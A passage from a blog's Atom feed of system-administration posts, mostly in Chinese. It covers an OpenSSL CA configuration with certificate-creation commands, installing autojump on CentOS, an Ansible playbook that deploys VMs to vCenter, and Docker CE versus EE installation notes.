certify for</div><div class="line">default_crl_days= 30            # how long before next CRL</div><div class="line">default_md  = sha256        # use public key default MD</div><div class="line">preserve    = no            # keep passed DN ordering</div><div class="line">policy      = policy_dn</div><div class="line">[ policy_match ]</div><div class="line">countryName     = match</div><div class="line">stateOrProvinceName = match</div><div class="line">organizationName    = match</div><div class="line">organizationalUnitName  = optional</div><div class="line">commonName      = supplied</div><div class="line">emailAddress        = optional</div><div class="line">[ policy_anything ]</div><div class="line">countryName     = optional</div><div class="line">stateOrProvinceName = optional</div><div class="line">localityName        = optional</div><div class="line">organizationName    = optional</div><div class="line">organizationalUnitName  = optional</div><div class="line">commonName      = supplied</div><div class="line">emailAddress        = optional</div><div class="line">[ policy_dn ]</div><div class="line">countryName             = supplied              # required parameter, any value allowed</div><div class="line">stateOrProvinceName     = optional</div><div class="line">localityName            = optional</div><div class="line">organizationName        = match                 # required, and must match root certificate</div><div class="line">organizationalUnitName  = optional</div><div class="line">commonName              = supplied              # required parameter, any value allowed</div><div class="line">emailAddress            = optional              # email in DN is deprecated, use subjectAltName</div><div class="line">[ req ]</div><div class="line">default_bits        = 2048</div><div class="line">default_md      = sha256</div><div class="line">encrypt_key             = no</div><div class="line">prompt                  = yes</div><div class="line">default_keyfile     = client.key</div><div class="line">distinguished_name  = req_distinguished_name</div><div class="line">x509_extensions = v3_ca # The extentions to add to the self signed cert</div><div class="line">string_mask = utf8only</div><div class="line">[ req_distinguished_name ]</div><div class="line">countryName         = Country Name (2 letter code)</div><div class="line">countryName_default     = CN</div><div class="line">countryName_min         = 2</div><div class="line">countryName_max         = 2</div><div class="line">stateOrProvinceName     = State or Province Name (full name)</div><div class="line">stateOrProvinceName_default = Beijing</div><div class="line">localityName            = Locality Name (eg, city)</div><div class="line">localityName_default        = Beijing</div><div class="line">0.organizationName      = Organization Name (eg, company)</div><div class="line">0.organizationName_default  = Beijing Century Fortunet Network Technology Co.,Ltd.</div><div class="line">organizationalUnitName      = Organizational Unit Name (eg, section)</div><div class="line">organizationalUnitName_default  = IT Operation Management</div><div class="line">commonName          = Common Name (eg, your name or your server\&apos;s hostname)</div><div class="line">commonName_max          = 64</div><div class="line">emailAddress            = Email Address</div><div class="line">emailAddress_max        = 64</div><div class="line">emailAddress_default        = admin@conf.top</div><div class="line">[ req_attributes ]</div><div class="line">challengePassword       = A challenge password</div><div class="line">challengePassword_min       = 4</div><div class="line">challengePassword_max       = 20</div><div class="line">unstructuredName        = An optional company name</div><div class="line">[ usr_cert ]</div><div class="line">basicConstraints    = CA:FALSE</div><div class="line">nsComment       = &quot;CONFCA Generated Certificate&quot;</div><div class="line">subjectKeyIdentifier    = hash</div><div class="line">authorityKeyIdentifier  = keyid,issuer</div><div class="line">[ v3_req ]</div><div class="line">basicConstraints    = CA:FALSE</div><div class="line">keyUsage        = digitalSignature, keyEncipherment</div><div class="line">extendedKeyUsage        = serverAuth, clientAuth</div><div class="line">subjectKeyIdentifier    = hash</div><div class="line">subjectAltName      = @alt_names</div><div class="line">[ v3_ca ]</div><div class="line">subjectKeyIdentifier=hash</div><div class="line">authorityKeyIdentifier=keyid:always,issuer</div><div class="line">keyUsage        = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment, keyAgreement, keyCertSign, cRLSign</div><div class="line">extendedKeyUsage        = serverAuth, clientAuth, codeSigning, timeStamping, emailProtection, msEFS, 1.3.6.1.4.1.311.10.3.11, 1.3.6.1.4.1.311.20.2.2</div><div class="line">basicConstraints = CA:true</div><div class="line">[ X509_ca ]</div><div class="line">basicConstraints        = CA:TRUE</div><div class="line">nsCertType              = sslCA                 # restrict the usage</div><div class="line">keyUsage                = keyCertSign, cRLSign  # restrict the usage</div><div class="line">subjectKeyIdentifier    = hash</div><div class="line">authorityKeyIdentifier  = keyid:always,issuer:always</div><div class="line">[ X509_server ]</div><div class="line">basicConstraints        = CA:FALSE</div><div class="line">nsCertType              = server                # restrict the usage</div><div class="line">keyUsage                = digitalSignature, keyEncipherment</div><div class="line">extendedKeyUsage        = serverAuth            # restrict the usage</div><div class="line">subjectKeyIdentifier    = hash</div><div class="line">authorityKeyIdentifier  = keyid,issuer</div><div class="line">[ X509_client ]</div><div class="line">basicConstraints        = CA:FALSE</div><div class="line">nsCertType              = client                # restrict the usage</div><div class="line">keyUsage                = digitalSignature      # restrict the usage</div><div class="line">extendedKeyUsage        = clientAuth            # restrict the usage</div><div class="line">subjectKeyIdentifier    = hash</div><div class="line">authorityKeyIdentifier  = keyid,issuer</div><div class="line">[ crl_ext ]</div><div class="line">authorityKeyIdentifier=keyid:always</div><div class="line">[ proxy_cert_ext ]</div><div class="line">basicConstraints=CA:FALSE</div><div class="line">nsComment           = &quot;CONFCA Generated Certificate&quot;</div><div class="line">subjectKeyIdentifier=hash</div><div class="line">authorityKeyIdentifier=keyid,issuer</div><div class="line">proxyCertInfo=critical,language:id-ppl-anyLanguage,pathlen:3,policy:foo</div><div class="line">[ tsa ]</div><div class="line">default_tsa = tsa_config1   # the default TSA section</div><div class="line">[ tsa_config1 ]</div><div class="line">dir     = ./demoCA      # TSA root directory</div><div class="line">serial      = $dir/tsaserial    # The current serial number (mandatory)</div><div class="line">crypto_device   = builtin       # OpenSSL engine to use for signing</div><div class="line">signer_cert = $dir/tsacert.pem  # The TSA signing certificate</div><div class="line">                   # (optional)</div><div class="line">certs       = $dir/cacert.pem   # Certificate chain to include in reply</div><div class="line">                   # (optional)</div><div class="line">signer_key  = $dir/private/tsakey.pem # The TSA private key (optional)</div><div class="line">default_policy  = tsa_policy1       # Policy if request did not specify it</div><div class="line">                   # (optional)</div><div class="line">other_policies  = tsa_policy2, tsa_policy3  # acceptable policies (optional)</div><div class="line">digests     = md5, sha1     # Acceptable message digests (mandatory)</div><div class="line">accuracy    = secs:1, millisecs:500, microsecs:100  # (optional)</div><div class="line">clock_precision_digits  = 0 # number of digits after dot. (optional)</div><div class="line">ordering        = yes   # Is ordering defined for timestamps?</div><div class="line">               # (optional, default: no)</div><div class="line">tsa_name        = yes   # Must the TSA name be included in the reply?</div><div class="line">               # (optional, default: no)</div><div class="line">ess_cert_id_chain   = no    # Must the ESS cert id chain be included?</div><div class="line">               # (optional, default: no)</div><div class="line">[ alt_names ]</div><div class="line">DNS.1 = conf.top</div><div class="line">DNS.2 = *.conf.top</div><div class="line">DNS.3 = vpn.conf.top</div><div class="line">DNS.4 = *.vpn.conf.top</div><div class="line">DNS.5 = ldap.conf.top</div><div class="line">DNS.6 = *.ldap.conf.top</div></pre></td></tr></table></figure>
<p>该文件主要设置了证书请求、签名、crl相关的配置。主要相关的伪命令为ca和req。对于x509不用该配置文件<br>该文件从功能结构上分为4个段落：默认段、ca相关的段、req相关的段、tsa相关的段。每个段中都以name=value的格式定义。<br>该文件中没有被引用的段被视为忽略段，不会起到任何作用。<br>每个段中可以书写哪些name以及它们的意义，可以man相关命令，如man ca可以查看ca相关段可以书写的name，man req可以查看req相关段可以书写的name。</p>
<p>如有域名或更多的IP，请参考如下方式追加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">DNS.1 = [example1.com]</div><div class="line">DNS.2 = [example2.com]</div><div class="line">IP.2 = [IP2]</div><div class="line">IP.3 = [IP3]</div></pre></td></tr></table></figure></p>
<h5 id="create-ca"><a href="#create-ca" class="headerlink" title="create ca "></a><b>create ca </b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 创建CA证书的私钥</div><div class="line">openssl genrsa -out private/ca.key 2048</div><div class="line"># 创建CA证书的公钥，其他配置可以默认，出现 Common Name (eg, your name or your server&apos;s hostname) []:</div><div class="line"># 的时候一定不能默认了，CA证书这里就输入CONFCA</div><div class="line">openssl req -days 177121 -new -sha256 -x509 -key private/ca.key -out certs/ca.crt -config openssl.cnf</div></pre></td></tr></table></figure>
<h5 id="create-domain-cert"><a href="#create-domain-cert" class="headerlink" title="create domain cert "></a><b>create domain cert </b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">## 创建key</div><div class="line">openssl genrsa -out private/conf.top.key 2048  </div><div class="line">## 生成csr文件,同样遇到输入 Common Name  的时候不能默认，这里输入conf.top</div><div class="line">openssl req -new -sha256 -key private/conf.top.key -out csr/conf.top.csr -extensions v3_req -config openssl.cnf</div><div class="line">## 签名证书</div><div class="line">openssl ca -days 30659 -in csr/conf.top.csr -out certs/conf.top.crt -extensions v3_req -config openssl.cnf</div></pre></td></tr></table></figure>
<p>ref<br><a href="https://www.jslink.org/linux/openldap-ssl-sssd.html" target="_blank" rel="external">ssl域名证书</a><br><a href="http://www.cnblogs.com/gsls200808/p/4502044.html" target="_blank" rel="external">openssl生成证书链多级证书</a><br><a href="https://github.com/tdharris/openssl-toolkit" target="_blank" rel="external">openssl-toolkit</a><br><a href="https://evilshit.wordpress.com/2013/06/19/how-to-create-your-own-pki-with-openssl/" target="_blank" rel="external">How to create your own PKI with openssl</a><br><a href="https://gist.github.com/ezimuel/3cb601853db6ebc4ee49" target="_blank" rel="external">Sign and verify a file using OpenSSL command line tool</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;make-work-dir&quot;&gt;&lt;a href=&quot;#make-work-dir&quot; class=&quot;headerlink&quot; title=&quot;make work dir&quot;&gt;&lt;/a&gt;&lt;b&gt;make work dir&lt;/b&gt;&lt;/h5&gt;&lt;figure class=&quot;highlig
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>faster way to navigate your filesystem for CentOS</title>
    <link href="https://t1ger.github.io/2017/04/07/faster-way-to-navigate-your-filesystem-for-CentOS/"/>
    <id>https://t1ger.github.io/2017/04/07/faster-way-to-navigate-your-filesystem-for-CentOS/</id>
    <published>2017-04-07T08:49:43.000Z</published>
    <updated>2017-04-07T08:12:14.582Z</updated>
    
    <content type="html"><![CDATA[<h5 id="What-is-autojump"><a href="#What-is-autojump" class="headerlink" title="What is autojump"></a><b>What is autojump</b></h5><p>autojump is a faster way to navigate your filesystem. It works by maintaining a database of the directories you use the most from the command line.</p>
<p>Directories must be visited first before they can be jumped to.</p>
<h5 id="How-to-Install"><a href="#How-to-Install" class="headerlink" title="How to Install"></a><b>How to Install</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">yum install epel-release</div><div class="line">yum install autojump</div><div class="line"></div><div class="line">如果你是bash，则添加如下到 ~/.bashrc</div><div class="line">[[ -s /etc/profile.d/autojump.bash ]] &amp;&amp; . /etc/profile.d/autojump.bash</div></pre></td></tr></table></figure>
<h5 id="How-to-usage"><a href="#How-to-usage" class="headerlink" title="How to usage"></a><b>How to usage</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">j 目录名字</div><div class="line"></div><div class="line">手动添加目录</div><div class="line">j -a [目录]</div><div class="line"></div><div class="line">手工增加权重</div><div class="line">j -i [权重]</div><div class="line"></div><div class="line">手动减少权重</div><div class="line">j -d [权重] </div><div class="line"></div><div class="line">显示数据库中的统计数据</div><div class="line">j -s</div><div class="line"></div><div class="line">将不存在的目录从数据库中移除</div><div class="line">j --purge</div></pre></td></tr></table></figure>
<p>ref<br><a href="https://github.com/wting/autojump" target="_blank" rel="external">wting/autojump</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;What-is-autojump&quot;&gt;&lt;a href=&quot;#What-is-autojump&quot; class=&quot;headerlink&quot; title=&quot;What is autojump&quot;&gt;&lt;/a&gt;&lt;b&gt;What is autojump&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;autojum
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Deploy VM to vCenter with Ansible</title>
    <link href="https://t1ger.github.io/2017/03/21/Deploy-VM-to-vCenter-with-Ansible/"/>
    <id>https://t1ger.github.io/2017/03/21/Deploy-VM-to-vCenter-with-Ansible/</id>
    <published>2017-03-21T07:19:51.000Z</published>
    <updated>2017-03-21T07:22:21.172Z</updated>
    
    <content type="html"><![CDATA[<p>ready work </p>
<ul>
<li>install ansible<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># yum install epel-release -y</div><div class="line"># yum install python2-pip -y</div><div class="line"># pip install pysphere</div><div class="line"># yum install ansible -y</div><div class="line">[root@localhost ~]# ansible --version</div><div class="line">ansible 2.2.1.0</div></pre></td></tr></table></figure>
</li>
</ul>
<p>ansible config</p>
<ul>
<li><p>create our inventory list</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[root@localhost vm-playbook]# cat create_hosts </div><div class="line">[dev-vms]</div><div class="line">ans-dev[127:128] disk=&apos;50&apos; datastore=&apos;datastore1&apos; network=&apos;VM Network&apos; memory=&apos;256&apos; cpucount=&apos;2&apos; osid=&apos;centos64Guest&apos;</div><div class="line"></div><div class="line">ans-dev[127:128]= -  actual VM names that we will be creating</div><div class="line">disk= — is the size in GB to create for each VM</div><div class="line">datastore= — name of the datastore to create the VMs on</div><div class="line">network= — name of network (portgroup) to place the VMs on</div><div class="line">memory= — the amount of memory in MB to allocate to the VMs</div><div class="line">cpucount= — the number of vCPU’s to allocate to the VMs</div><div class="line">osid= — the OS Identifier to specify for the OS type…. reference this guide for OSID’s</div></pre></td></tr></table></figure>
</li>
<li><p>create the actual ansible playbook to run to create the VMs</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">[root@localhost vm-playbook]# cat create_vms.yml </div><div class="line">---</div><div class="line">- hosts: all</div><div class="line">  gather_facts: false</div><div class="line">  connection: local</div><div class="line">  user: root</div><div class="line">  sudo: false</div><div class="line">  serial: 1</div><div class="line"></div><div class="line">  vars_prompt:</div><div class="line">    - name: &quot;vcenter_hostname&quot;</div><div class="line">      prompt: &quot;Enter vcenter hostname&quot;</div><div class="line">      private: no</div><div class="line">      default: &quot;vcsa&quot;</div><div class="line">    - name: &quot;vcenter_user&quot;</div><div class="line">      prompt: &quot;Enter vcenter username&quot;</div><div class="line">      private: no</div><div class="line">    - name: &quot;vcenter_pass&quot;</div><div class="line">      prompt: &quot;Enter vcenter password&quot;</div><div class="line">      private: yes</div><div class="line"></div><div class="line">  vars:</div><div class="line">    datacenter: &apos;whistle&apos;</div><div class="line">    esxi_host: &apos;192.168.100.120&apos;</div><div class="line">    notes: &apos;Created by Ansible&apos;</div><div class="line"></div><div class="line">  tasks:</div><div class="line">    - vsphere_guest:</div><div class="line">        vcenter_hostname: &quot;&#123;&#123; vcenter_hostname &#125;&#125;&quot;</div><div class="line">        username: &quot;&#123;&#123; vcenter_user &#125;&#125;&quot;</div><div class="line">        password: &quot;&#123;&#123; vcenter_pass &#125;&#125;&quot;</div><div class="line">        guest: &quot;&#123;&#123; inventory_hostname &#125;&#125;&quot;</div><div class="line">        state: present</div><div class="line">        vm_extra_config:</div><div class="line">          notes: &quot;&#123;&#123; notes &#125;&#125;&quot;</div><div class="line">          vcpu.hotadd: yes</div><div class="line">          mem.hotadd:  yes</div><div class="line">          #folder: ansible_test</div><div class="line">        vm_disk:</div><div class="line">          disk1:</div><div class="line">            size_gb: &quot;&#123;&#123; disk &#125;&#125;&quot;</div><div class="line">            type: thin</div><div class="line">            datastore: &quot;&#123;&#123; datastore &#125;&#125;&quot;</div><div class="line">            # VMs can be put into folders. The value given here is either the full path</div><div class="line">            # to the folder (e.g. production/customerA/lamp) or just the last component</div><div class="line">            # of the path (e.g. lamp):</div><div class="line">            #folder: production/customerA/lamp</div><div class="line">        vm_nic:</div><div class="line">          nic1:</div><div class="line">            type: e1000</div><div class="line">            network: &quot;&#123;&#123; network &#125;&#125;&quot;</div><div class="line">            network_type: standard</div><div class="line">        vm_hardware:</div><div class="line">          memory_mb: &quot;&#123;&#123; memory &#125;&#125;&quot;</div><div class="line">          num_cpus: &quot;&#123;&#123; cpucount &#125;&#125;&quot;</div><div class="line">          osid: &quot;&#123;&#123; osid &#125;&#125;&quot;</div><div class="line">          scsi: paravirtual</div><div class="line">          vm_cdrom:</div><div class="line">                type: &quot;iso&quot;</div><div class="line">                iso_path: &quot;datastore1/iso/CentOS-Basic7.3-01071715.iso&quot;</div><div class="line">        esxi:</div><div class="line">          datacenter: &quot;&#123;&#123; datacenter &#125;&#125;&quot;</div><div class="line">          hostname: &quot;&#123;&#123; esxi_host &#125;&#125;&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>now ready to run your playbook</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">[root@localhost vm-playbook]# ansible-playbook -i create_hosts create_vms.yml </div><div class="line">SSH password: </div><div class="line">[DEPRECATION WARNING]: Instead of sudo/sudo_user, use become/become_user and make sure become_method is &apos;sudo&apos; (default).</div><div class="line">This feature will be removed in a future release. Deprecation </div><div class="line">warnings can be disabled by setting deprecation_warnings=False in ansible.cfg.</div><div class="line">Enter vcenter hostname [vcsa]: 192.168.100.120</div><div class="line">Enter vcenter username: administrator</div><div class="line">Enter vcenter password: </div><div class="line"></div><div class="line">PLAY [all] *********************************************************************</div><div class="line"></div><div class="line">TASK [vsphere_guest] ***********************************************************</div><div class="line">changed: [ans-dev127]</div><div class="line"></div><div class="line">PLAY [all] *********************************************************************</div><div class="line"></div><div class="line">TASK [vsphere_guest] ***********************************************************</div><div class="line">changed: [ans-dev128]</div><div class="line"></div><div class="line">PLAY RECAP *********************************************************************</div><div class="line">ans-dev127                 : ok=1    changed=1    unreachable=0    failed=0   </div><div class="line">ans-dev128                 : ok=1    changed=1    unreachable=0    failed=0</div></pre></td></tr></table></figure>
</li>
</ul>
<p>ref</p>
<p><a href="http://docs.ansible.com/ansible/vsphere_guest_module.html" target="_blank" rel="external">vsphere_guest - Create/delete/manage a guest VM through VMware vSphere</a><br><a href="http://everythingshouldbevirtual.com/creating-vsphere-vms-using-ansible" target="_blank" rel="external">Creating vSphere VM’s using Ansible</a><br><a href="http://serverfault.com/questions/740193/create-multiple-vmware-guests-with-vsphere-guest-module" target="_blank" rel="external">Create multiple VMware guests with vsphere_guest module</a><br><a href="http://probably.co.uk/managing-vmware-vsphere-guests-with-ansible-tower.html" target="_blank" rel="external">Managing VMware vSphere guests with Ansible Tower</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ready work &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;install ansible&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Docker CE vs Docker EE</title>
    <link href="https://t1ger.github.io/2017/03/14/Docker-CE-vs-Docker-EE/"/>
    <id>https://t1ger.github.io/2017/03/14/Docker-CE-vs-Docker-EE/</id>
    <published>2017-03-14T08:59:18.000Z</published>
    <updated>2017-03-14T08:45:27.454Z</updated>
    
    <content type="html"><![CDATA[<p>Docker2016年就明确了将会在企业级方面重点跟进，惊喜就这样来了，在2017年的3月1号之后，Docker的版本命名开始发生变化，同时将CE版本和EE版本进行分开，而这些也是新安装docker时候发现的，一起简单来看一下具体情况吧</p>
<h5 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a><b>版本说明</b></h5><p>在此之前docker的最新版本更新到docker1.13，而在1.13的基础之上，在2017年的3月1号开始，版本的格式变为如下</p>
<p>项目    说明<br>版本格式    YY.MM<br>stable版本    每个季度发行<br>edge版本    每个月发行<br>当前CE版本    17.03.0-ce</p>
<p>同时将Docker分成CE和EE2个版本。CE版本即社区版(免费，支持周期三个月),EE企业版，强调安全，付费使用。<br>当前的CE版本为17.03.0-ce，基于V1.13.0.主要修复错误，没有重大功能增加，API亦保持不变。</p>
<h5 id="安装CE版本的Docker"><a href="#安装CE版本的Docker" class="headerlink" title="安装CE版本的Docker"></a><b>安装CE版本的Docker</b></h5><p>安装参看官方提供Manual如下</p>
<p>项目    详细<br>CENTOS安装CE版    <a href="https://store.docker.com/editions/community/docker-ce-server-centos?tab=description" target="_blank" rel="external">https://store.docker.com/editions/community/docker-ce-server-centos?tab=description</a><br>也可以使用Easypack下面提供的脚本，只是将上面的内容顺次写进去，加上enable和start以及firewall的关闭等操作而已。</p>
<p>项目    详细<br>CENTOS安装CE（Easypack）版    <a href="https://github.com/liumiaocn/easypack/tree/master/docker" target="_blank" rel="external">https://github.com/liumiaocn/easypack/tree/master/docker</a></p>
<h5 id="安装FAQ"><a href="#安装FAQ" class="headerlink" title="安装FAQ"></a><b>安装FAQ</b></h5><p>在yum 安装时候，报出Peer’s Certificate has expired的错误</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">failure: repodata/repomd.xml from docker-ce-stable: [Errno 256] No more mirrors to try.</div><div class="line">https://download.docker.com/linux/centos/7/x86_64/stable/repodata/repomd.xml: [Errno 14] curl#60 - &quot;Peer&apos;s Certificate has expired.&quot;</div></pre></td></tr></table></figure>
<p>搜索很久，终于看到有位兄弟碰到过，原来是本地时间不正确造成的，详情见<a href="https://xuxinkun.github.io/2016/04/21/curl-ca-problem/" target="_blank" rel="external">这里</a></p>
<p>进行一次ntp同步时间同步，问题解决<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntpdate pool.ntp.org</div></pre></td></tr></table></figure></p>
<p>ref<br><a href="https://docs.docker.com/engine/installation/linux/centos/" target="_blank" rel="external">Get Docker for CentOS</a><br><a href="https://xuxinkun.github.io/2016/04/21/curl-ca-problem/" target="_blank" rel="external">记一次解决curl https证书问题</a><br><a href="https://github.com/tiny1990/aboutTest" target="_blank" rel="external">docker的环境部署</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Docker2016年就明确了将会在企业级方面重点跟进，惊喜就这样来了，在2017年的3月1号之后，Docker的版本命名开始发生变化，同时将CE版本和EE版本进行分开，而这些也是新安装docker时候发现的，一起简单来看一下具体情况吧&lt;/p&gt;
&lt;h5 id=&quot;版本说明&quot;&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
